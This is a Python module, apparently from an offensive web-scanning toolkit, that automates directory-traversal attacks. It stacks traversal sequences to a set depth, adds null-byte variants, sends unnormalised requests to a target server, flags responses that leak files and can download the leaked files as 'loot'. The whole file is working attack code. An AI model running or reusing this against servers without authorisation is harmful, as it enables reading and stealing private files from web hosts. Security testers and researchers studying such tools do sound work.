#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;    
    , ;   
     .   
           
       .    
     .;.    
     .;  
      :  
      ,   
       

┌─[pathtrav]─[~]
└──╼ VainlyStrain
"""

from core.session import session
import requests
from core.colors import color
from core.variables import payloadlist
from core.filecheck import filecheck
from core.loot import download

def inpath(url,url2,keyword,files,dirs,depth,verbose,dl,summary):
    found=[]
    urls = []
    s = session()
    if not url.endswith("/"):
        url += "/"
    con2 = requests.get(url).content
    for dir in dirs:
        for file in files:
            d=1
            while d <= depth:
                for i in payloadlist:
                    traverse=''
                    j=1
                    while j <= d:
                        traverse+=i
                        j+=1
                    requestlist = []
                    path = traverse+dir+file+url2
                    req = requests.Request(method='GET', url=url)
                    prep = req.prepare()
                    prep.url = url + path
                    r = s.send(prep)
                    requestlist.append(r)
                    path2=traverse+dir+file+"%00"+url2
                    req = requests.Request(method='GET', url=url)
                    prep = req.prepare()
                    prep.url = url + path2
                    r = s.send(prep)
                    requestlist.append(r)
                    for r in requestlist:
                        if str(r.status_code).startswith("2") or r.status_code == 302:
                            if filecheck(r.content, con2):
                                print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"site"+color.END+"="+r.url)
                                if dl and dir+file not in found:
                                    download(r.url,file)
                                found.append(dir+file)
                                vlnlist = r.url.split("/")[1::]
                                vlnpath = ("/".join(i for i in vlnlist)).replace(url2, "")
                                urls.append(color.RD + "[path]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + vlnpath)
                        elif r.status_code == 403:
                            print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"site"+color.END+"="+r.url)
                            found.append(dir+file)
                            vlnlist = r.url.split("/")[1::]
                            vlnpath = ("/".join(i for i in vlnlist)).replace(url2, "")
                            urls.append(color.RD + "[path]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + vlnpath)
                        else:
                            if verbose:
                                print(color.RD+"{}|: ".format(r.status_code)+color.END+color.RC+r.url+color.END)
                d+=1
    return (found, urls)
 
